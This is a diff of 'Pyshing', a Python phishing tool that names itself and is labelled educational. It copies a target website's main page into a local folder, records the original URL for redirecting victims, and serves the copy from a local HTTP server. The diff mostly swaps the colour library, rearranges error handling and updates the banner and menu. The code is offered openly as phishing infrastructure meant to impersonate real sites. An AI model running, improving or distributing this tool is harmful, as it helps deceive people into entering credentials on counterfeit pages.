@@ -1,6 +1,6 @@
 #!/usr/bin/python
 '''
-Name: Pyshing 1.2
+Name: Pyshing v1.3
 Version: Python 3.7.4
 -
 The tool is for educational purposes
@@ -8,47 +8,47 @@ The tool is for educational purposes
 https://github.com/r4msolo
 Author: R4MSOLO
 '''
-from colorama import Fore, Style
+import core.server
 import urllib.request
 
 class Pyshing():
     def __init__(self):
-        print(Style.RESET_ALL)
         print(options)
-        opt = int(input("=>"))
+        opt = int(input(BOLD+RED+"[pyshing]# "+ENDC))
         if opt == 1:
-            try:
-                self.pageClone()
-            except OSError:
-                print("[!] Error, check your internet connection\n")
+        	self.pageClone()
         elif opt == 2:
-            try:
-                import core.server
-                core.server.SimpleHTTPRequestHandler()
-            except OSError:
-                print("[!] Address already in use\n")
+        	core.server.SimpleHTTPRequestHandler.run()
         elif opt == 0:
             quit()
         else:
-            print("[!] Invalid option!\n")
+            print(RED+"[!] Invalid option!\n")
 
-    def pageClone(self):    #Clone the pages
-        url = str(input("URL clone: "))
-        contents = urllib.request.urlopen(url).read()
-        contents = contents.decode('UTF-8')
-        file = open('site/index.html','w')
-        file.write(contents)
-        file.close()
-        print("[+] Main page copied... ")
-        del contents
-        file = open('site/redirect.txt', 'w')
-        file.write(url)
-        file.close()
-        Pyshing()
+    def pageClone(self):
+    	try:
+    		url = str(input(BOLD+BLUE+"URL clone: "+ENDC))
+    		contents = urllib.request.urlopen(url).read()
+    		contents = contents.decode('UTF-8')
+    		file = open('site/index.html','w')
+    		file.write(contents)
+    		file.close()
+    		print(BOLD+GREEN+"[+] Main page copied... "+ENDC)
+    		del contents
+    		file = open('site/redirect.txt', 'w')
+    		file.write(url)
+    		file.close()
+    	except OSError:
+    		print(RED+"[!] Error, check your internet connection\n"+ENDC)
+    	Pyshing()
 
+'''colors'''
+BLUE = '\033[94m'
+RED = '\033[91m'
+GREEN = '\033[92m'
+BOLD = '\033[1m'
+ENDC = '\033[0m'
 
-
-banner = Fore.CYAN+'''
+banner = BLUE+'''
                                 ,,          ,,                        
 `7MM"""Mq.                    `7MM          db                        
   MM   `MM.                     MM                                    
@@ -59,14 +59,14 @@ banner = Fore.CYAN+'''
 .JMML.         ,V     M9mmmP' .JMML  JMML..JMML..JMML  JMML. YMMMMMb  
               ,V                                            6'     dP 
            OOb"                                             Ybmmmd'  
-                                             Version: 1.1
+                                             Version: 1.3
                                              Author: R4MSOLO\n
-'''
-options = '''
-1) Clone a Website
-2) Start Server
+'''+ENDC
+
+options = BOLD+GREEN+'''
+1) Clone a Website	2) Start Server
 0) Exit
-'''
+'''+ENDC
 
 if __name__ == '__main__':
     try:
